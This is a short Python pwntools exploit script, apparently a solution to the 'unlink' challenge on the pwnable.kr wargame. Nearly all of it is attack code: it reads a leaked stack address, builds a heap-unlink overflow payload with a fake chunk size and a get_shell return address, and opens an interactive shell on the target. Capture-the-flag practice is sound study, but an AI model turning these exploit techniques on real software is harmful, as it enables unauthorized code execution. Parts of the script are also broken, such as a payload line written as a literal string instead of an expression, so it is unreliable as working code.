from pwn import *
import sys

def main():
    if(len(sys.argv)!= 2):
        print(f"Correct usage is : {sys.argv[0]} <target machine e.g. remote>")
        exit(1)
    if(sys.argv[1]=="remote"):
        p = remote("pwnable.kr", 9032)
        # this is temporary, will set the ssh-isms later.
    elif(sys.argv[1]=="local"):
        p = process("./unlink")
    else:
        p = process("./unlink")
    
    payload= b"A*20 + \x21\x00\x00\x00"

    get_shell=struct.pack("I",0x080484EB)
    p.recvuntil("address leak: ")
    ESP = p.recvuntil("\n")
    ESP=ESP[:-1] # remove \n from ESP
    print(f"Leaked Stack = {ESP}")
    # let's add the offset of unlink's return addr to the leaked ESP
    ESP_num = int.from_bytes(ESP, byteorder='little')
    ESP_num= ESP_num-28
    ESP= ESP_num.to_bytes(len(ESP),byteorder='little')
    payload+=ESP
    payload+=get_shell
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    ESP = struct.pack("I",0xffffd6e4-28)
    get_shell=struct.pack("I",0x080484EB)

    payload= b"A"*20 + b"\x21\x00\x00\x00"  
    payload+= ESP
    payload+=get_shell
    sys.stdout.buffer.write(payload)
    # main()
